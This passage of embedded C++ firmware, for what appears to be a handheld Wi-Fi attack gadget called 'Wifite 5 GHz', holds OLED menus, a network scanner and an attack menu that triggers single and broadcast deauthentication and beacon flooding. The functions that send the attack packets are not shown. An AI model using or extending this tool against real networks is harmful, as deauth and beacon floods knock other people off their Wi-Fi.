  for (int i = 0; i < 19; i++) {
    int x1 = i * (SCREEN_WIDTH / 20);
    int x2 = (i + 1) * (SCREEN_WIDTH / 20);
    int y1 = 50 - map(packet_rates[i], 0, max_rate, 0, 40);
    int y2 = 50 - map(packet_rates[(i + 1) % 20], 0, max_rate, 0, 40);
    display.drawLine(x1, y1, x2, y2, WHITE);
    display.drawPixel(x1, y1 - 1, WHITE); // Glowing effect
    display.drawPixel(x1, y1 + 1, WHITE);
  }

  // Stats HUD
  display.setTextSize(1);
  display.setTextColor(WHITE);
  display.setCursor(2, 52);
  display.print(F("Ch:"));
  display.print(current_channel);
  display.setCursor(40, 52);
  display.print(F("APs/s:"));
  display.print(packet_rates[packet_buffer_index]);
  display.setCursor(90, 52);
  display.print(F("Tot:"));
  display.print(packet_count);
}

void drawAttackScreen(int attackType) {
  display.clearDisplay();
  drawFrame();
  drawStatusBar(currentLanguage == 0 ? "ATTACK IN PROGRESS" : "DANG TAN CONG");

  display.setTextColor(WHITE);
  display.setCursor(10, 20);

  const char *attackTypesEN[] = { "SINGLE DEAUTH", "ALL DEAUTH", "BEACON", "BEACON+DEAUTH" };
  const char *attackTypesVI[] = { "TAN CONG DON", "TAN CONG TAT CA", "BEACON", "BEACON+DEAUTH" };
  const char **attackTypes = currentLanguage == 0 ? attackTypesEN : attackTypesVI;

  if (attackType >= 0 && attackType < 4) {
    display.print(attackTypes[attackType]);
  }

  static const char patterns[] = { '.', 'o', 'O', 'o' };
  for (size_t i = 0; i < sizeof(patterns); i++) {
    display.setCursor(10, 35);
    display.print(currentLanguage == 0 ? F("Running ") : F("Dang chay "));
    display.print(patterns[i]);
    display.display();
    delay(200);
  }
}

void titleScreen(void) {
  display.clearDisplay();
  display.setTextWrap(false);
  display.setTextSize(1);
  display.setTextColor(WHITE);
  display.setCursor(6, 7);
  display.print(F("Wifite"));
  display.setCursor(24, 48);
  display.print(F("5 GHz"));
  display.setCursor(4, 55);
  display.print(F("NGUYEN HOANG DEVELOPER"));
  display.drawBitmap(1, 20, image_wifi_not_connected__copy__bits, 19, 16, 1);
  display.drawBitmap(112, 35, image_off_text_bits, 12, 5, 1);
  display.drawBitmap(45, 19, image_wifi_not_connected__copy__bits, 19, 16, 1);
  display.drawBitmap(24, 34, image_off_text_bits, 12, 5, 1);
  display.drawBitmap(106, 14, image_wifi_not_connected__copy__bits, 19, 16, 1);
  display.drawBitmap(88, 25, image_wifi_not_connected__copy__bits, 19, 16, 1);
  display.drawBitmap(9, 35, image_cross_contour_bits, 11, 16, 1);
  display.display();
  delay(1500);
}

void attackLoop() {
  int attackState = 0;
  bool running = true;
  while (digitalRead(BTN_OK) == LOW) {
    delay(10);
  }

  while (running) {
    display.clearDisplay();
    drawFrame();
    drawStatusBar(currentLanguage == 0 ? "ATTACK MODE" : "CHE DO TAN CONG");

    const char *attackTypesEN[] = { "Single Deauth", "All Deauth", "Beacon", "Beacon+Deauth", "Back" };
    const char *attackTypesVI[] = { "Tan cong don", "Tan cong tat ca", "Beacon", "Beacon+Deauth", "Quay lai" };
    const char **attackTypes = currentLanguage == 0 ? attackTypesEN : attackTypesVI;

    for (int i = 0; i < 5; i++) {
      display.setCursor(10, 15 + (i * 10));
      if (i == attackState) {
        display.setTextColor(BLACK, WHITE);
      } else {
        display.setTextColor(WHITE);
      }
      display.print(attackTypes[i]);
    }
    display.display();

    if (digitalRead(BTN_OK) == LOW) {
      delay(150);
      if (attackState == 4) {
        running = false;
      } else {
        drawAttackScreen(attackState);
        switch (attackState) {
          case 0: Single(); break;
          case 1: All(); break;
          case 2: Becaon(); break;
          case 3: BecaonDeauth(); break;
        }
      }
    }

    if (digitalRead(BTN_UP) == LOW) {
      delay(150);
      if (attackState < 4) attackState++;
    }

    if (digitalRead(BTN_DOWN) == LOW) {
      delay(150);
      if (attackState > 0) attackState--;
    }
  }
}

void networkSelectionLoop() {
  bool running = true;
  while (digitalRead(BTN_OK) == LOW) {
    delay(10);
  }

  while (running) {
    drawNetworkList(SelectedSSID, scrollindex);

    if (digitalRead(BTN_OK) == LOW) {
      delay(150);
      while (digitalRead(BTN_OK) == LOW) {
        delay(10);
      }
      running = false;
    }

    if (digitalRead(BTN_UP) == LOW) {
      delay(150);
      if (static_cast<size_t>(scrollindex) < scan_results.size() - 1) {
        scrollindex++;
        SelectedSSID = scan_results[scrollindex].ssid;
        SSIDCh = scan_results[scrollindex].channel >= 36 ? "5G" : "2.4G";
      }
    }

    if (digitalRead(BTN_DOWN) == LOW) {
      delay(150);
      if (scrollindex > 0) {
        scrollindex--;
        SelectedSSID = scan_results[scrollindex].ssid;
        SSIDCh = scan_results[scrollindex].channel >= 36 ? "5G" : "2.4G";
      }
    }

    display.display();
    delay(50);
  }
}

void setup() {
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_OK, INPUT_PULLUP);
  pinMode(LED_BLUE, OUTPUT);
  digitalWrite(LED_BLUE, LOW);

  Serial.begin(115200);
  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println(F("SSD1306 init failed"));
    while (true);
  }
  titleScreen();
  DEBUG_SER_INIT();
  WiFi.apbegin(ssid, pass, (char *)String(current_channel).c_str());
  if (scanNetworks() != 0) {
    while (true) delay(1000);
  }

#ifdef DEBUG
  for (uint i = 0; i < scan_results.size(); i++) {
    DEBUG_SER_PRINT(scan_results[i].ssid + " ");
    for (int j = 0; j < 6; j++) {
      if (j > 0) DEBUG_SER_PRINT(":");
      DEBUG_SER_PRINT(scan_results[i].bssid[j], HEX);
    }
    DEBUG_SER_PRINT(" " + String(scan_results[i].channel) + " ");
    DEBUG_SER_PRINT(String(scan_results[i].rssi) + "\n");
  }
#endif
  if (!scan_results.empty()) {
    SelectedSSID = scan_results[0].ssid;
    SSIDCh = scan_results[0].channel >= 36 ? "5G" : "2.4G";
  }
}

void loop() {
  unsigned long currentTime = millis();
  drawMainMenu(menustate);

  if (digitalRead(BTN_OK) == LOW) {
    if (currentTime - lastOkTime > DEBOUNCE_DELAY) {
      if (okstate) {
        transitionEffect();

        switch (menustate) {
          case 0:
            display.clearDisplay();
            attackLoop();
            break;
          case 1:
            display.clearDisplay();
            drawScanScreen();
            if (scanNetworks() == 0) {
              drawStatusBar(currentLanguage == 0 ? "SCAN SUCCESS" : "QUET THANH CONG");
              display.display();
              delay(2000);
            }
            break;
          case 2:
            networkSelectionLoop();
            break;
          case 3:
            display.clearDisplay();
            drawStatusBar(currentLanguage == 0 ? "DEVELOPER" : "NHA PHAT TRIEN");
            display.setCursor(10, 20);
            display.print(F("Developer Info"));
            display.setCursor(15, 30);
            display.print(F("Nguyen Hoang"));
            display.setCursor(20, 40);
            display.print(F("X"));
            display.setCursor(25, 50);
            display.print(F("Nguyen Phat Tai"));
            display.display();
            delay(2000);
            break;
          case 4:
            display.clearDisplay();
            drawStatusBar(currentLanguage == 0 ? "VERSION" : "PHIEN BAN");
            display.setCursor(10, 20);
            display.print(F("Version 1.2"));
            display.display();
            delay(2000);
            break;
          case 5:
            settingsMenu();
            break;
          case 6:
            display.clearDisplay();
            drawStatusBar(currentLanguage == 0 ? "RESET" : "DAT LAI");
            display.setCursor(10, 20);
            display.print(currentLanguage == 0 ? F("Resetting...") : F("Dang dat lai..."));
            display.display();
            delay(1000);
            while (digitalRead(BTN_OK) == LOW) delay(10);
            setup();
            break;
          case 7:
            display.clearDisplay();
            drawStatusBar(currentLanguage == 0 ? "SHUT DOWN" : "TAT MAY");
            display.setCursor(10, 20);
            display.print(currentLanguage == 0 ? F("Shutting down...") : F("Dang tat..."));
            display.display();
            delay(1000);
            display.ssd1306_command(SSD1306_DISPLAYOFF);
            while (true) {
              delay(1000);
              if (digitalRead(BTN_OK) == LOW) {
                delay(150);
                display.ssd1306_command(SSD1306_DISPLAYON);
                setup();
                break;
              }
            }
            break;
          case 8:
            display.clearDisplay();
            PacketMonitor();
            break;
          case 9:
            display.clearDisplay();
            TetrisGame();
            break;
        }
      }
      lastOkTime = currentTime;
    }
  }

  if (digitalRead(BTN_DOWN) == LOW) {
    if (currentTime - lastDownTime > DEBOUNCE_DELAY) {
      if (menustate > 0) {
        menustate--;
        fadeTransition();
      }
      lastDownTime = currentTime;
    }
  }

  if (digitalRead(BTN_UP) == LOW) {
    if (currentTime - lastUpTime > DEBOUNCE_DELAY) {
      if (menustate < 9) { // Updated for 10 items
        menustate++;
        fadeTransition();
      }
      lastUpTime = currentTime;
    }
  }
}

void settingsMenu() {
  int settingState = 0;
  bool running = true;

  while (digitalRead(BTN_OK) == LOW) {
    delay(10);
  }

  while (running) {
    display.clearDisplay();
    drawStatusBar(currentLanguage == 0 ? "SETTINGS" : "CAI DAT");
    drawFrame();

    String perDeauthText = String(F("Per Deauth: ")) + String(perdeauth);
    String ledText = String(F("LED RGB: ")) + String(ledState ? "ON" : "OFF");
    String langText = String(F("Language: ")) + String(currentLanguage == 0 ? "EN" : "VI");

    display.setTextSize(1);
    display.setTextColor(WHITE);
    display.setCursor(10, 15);
    if (settingState == 0) display.setTextColor(BLACK, WHITE);
    display.print(perDeauthText);
    display.setTextColor(WHITE);
    display.setCursor(10, 25);
    if (settingState == 1) display.setTextColor(BLACK, WHITE);
    display.print(ledText);
    display.setTextColor(WHITE);
    display.setCursor(10, 35);
    if (settingState == 2) display.setTextColor(BLACK, WHITE);
    display.print(langText);
    display.setTextColor(WHITE);
    display.setCursor(10, 45);
    if (settingState == 3) display.setTextColor(BLACK, WHITE);
    display.print(currentLanguage == 0 ? "Back" : "Quay lai");

    display.display();

    if (digitalRead(BTN_OK) == LOW) {
      delay(150);
      if (settingState == 3) {
        running = false;
      } else if (settingState == 0) {
        perdeauth = (perdeauth % 20) + 1;
      } else if (settingState == 1) {
        ledState = !ledState;
        digitalWrite(LED_BLUE, ledState ? HIGH : LOW);
      } else if (settingState == 2) {
        currentLanguage = (currentLanguage + 1) % 2;
      }
      while (digitalRead(BTN_OK) == LOW) {
        delay(10);
      }
    }

    if (digitalRead(BTN_UP) == LOW) {
      delay(150);
      if (settingState < 3) settingState++;
      while (digitalRead(BTN_UP) == LOW) delay(10);
    }

    if (digitalRead(BTN_DOWN) == LOW) {
      delay(150);
      if (settingState > 0) settingState--;
      while (digitalRead(BTN_DOWN) == LOW) delay(10);
    }
  }
}

void fadeTransition() {
  display.invertDisplay(true);
  delay(30);
  display.invertDisplay(false);
  for (int brightness = 255; brightness >= 0; brightness -= 32) {
    display.ssd1306_command(SSD1306_SETCONTRAST);
    display.ssd1306_command(brightness);
    delay(20);
  }
  drawMainMenu(menustate);
  for (int brightness = 0; brightness <= 255; brightness += 32) {
    display.ssd1306_command(SSD1306_SETCONTRAST);
    display.ssd1306_command(brightness);
    delay(20);
  }
}

void transitionEffect() {
  for (int x = SCREEN_WIDTH; x >= 0; x -= 10) {
    display.clearDisplay();
    drawStatusBar(currentLanguage == 0 ? "MENU" : "THUC DON");
    display.setCursor(x, 20);
    display.print(currentLanguage == 0 ? F("Loading...") : F("Dang tai..."));
    display.display();
    delay(20);
  }
}
